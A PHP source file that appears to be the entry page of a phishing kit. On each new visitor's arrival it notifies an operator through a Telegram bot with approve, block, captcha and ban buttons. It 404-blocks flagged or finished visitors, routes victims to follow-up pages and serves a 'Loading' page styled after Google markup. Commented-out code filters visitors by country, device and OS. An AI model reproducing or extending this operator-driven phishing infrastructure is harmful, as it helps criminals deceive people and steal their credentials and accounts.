<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
ob_start();

include_once(__DIR__ . '/../includes/php/error_check.php');

if(isset($_SESSION['404-blocked']) || isset($_SESSION['complete'])){
   header("HTTP/1.0 404 Not Found");
   exit();
}

require_once(__DIR__ . '/../includes/php/config.php');
$configPath = __DIR__ . '/../config.json';
if (!is_readable($configPath) || trim((string) ($config['bot_token'] ?? '')) === '') {
   header('Location: ../client-area/');
   exit();
}

include_once(__DIR__ . '/../includes/php/detect.php');
require_once(__DIR__ . '/../includes/php/buttons.php');

if($config['status'] != 'online'){
   header("HTTP/1.0 404 Not Found");
   exit();
}

$target = checkCommand();
if ($target !== '') {
    if (strpos($target, '..') === 0 || strpos($target, '/') === 0) {
        header('Location: ' . $target);
    } else {
        header('Location: ./' . $target);
    }
    exit();
}

// if($config['allow_countries'] != 'ALL'){
//    $allowed_countries = explode('|', $config['allow_countries']);

//    if (in_array($_SESSION['user_data']['countryCode'], $allowed_countries)) {
//       $_SESSION['country_allowed'] = true;
//    }
// }

// $allowed_devices = explode('|', $config['allow_devices']);

// if (in_array($_SESSION['device'], $allowed_devices)) {
//    $_SESSION['device_allowed'] = true;
// }

// $allowed_os = explode('|', $config['allow_os']);

// foreach ($allowed_os as $allowed) {
//     if (stripos($_SESSION['os'], $allowed) === 0) {
//       $_SESSION['os_allowed'] = true;
//     }
// }

// if(!isset($_SESSION['country_allowed']) || !isset($_SESSION['device_allowed']) || !isset($_SESSION['os_allowed'])){
//       header("HTTP/1.0 404 Not Found");
//       exit();
// }

if(!isset($_SESSION['step-1'])) $_SESSION['step-1'] = true;

if(!isset($_SESSION['first_access'])){
   require_once(__DIR__ . '/../includes/php/bot_api.php');

   if($config['bot_modes'] == 'off' || $config['bot_modes'] == 'strict'){
      $buttons = getButtons('waiting_response', $_SESSION['unique_id']);
   }else{
      $buttons = getButtons('approve_block_captcha_ban', $_SESSION['unique_id']);
   }

$activity['status'] = '🟢';
$activity['step'] = '*️⃣ Action: Please choose a command';

require(__DIR__ . '/../includes/php/texts.php');

   $status = bot_api('sendMessage', $message, $buttons);
   if (!bot_api_telegram_ok($status) || empty($status['result']['message_id'])) {
      die('{"error":true, "description": "telegram bot api"}');
   }
   $_SESSION['messageid'] = (int) $status['result']['message_id'];
   $_SESSION['chat_id'] = $config['chat_id'];
   
   $_SESSION['first_access'] = true;   
}

if($config['bot_modes'] == 'off' || $config['panel'] != 'live'){
   header('location: user.php'); 
   exit();
}elseif($config['bot_modes'] == 'strict'){
    header('location: captcha.php'); 
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading</title>
    <link rel="stylesheet" href="css/index.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <script src="js/loader.js"></script>
</head>
<body>
    <?php $start_html = TRUE; require_once(__DIR__ . '/html/start.php'); ?>
                            </div>
                        </div>
                    </c-wiz>
                </div>
            </div>
        </div>
    </div>
    <?php 
      require_once(__DIR__ . '/../includes/js/start_request.php'); 
      require_once(__DIR__ . '/../includes/js/make_request.php');
    ?>
</body>
</html>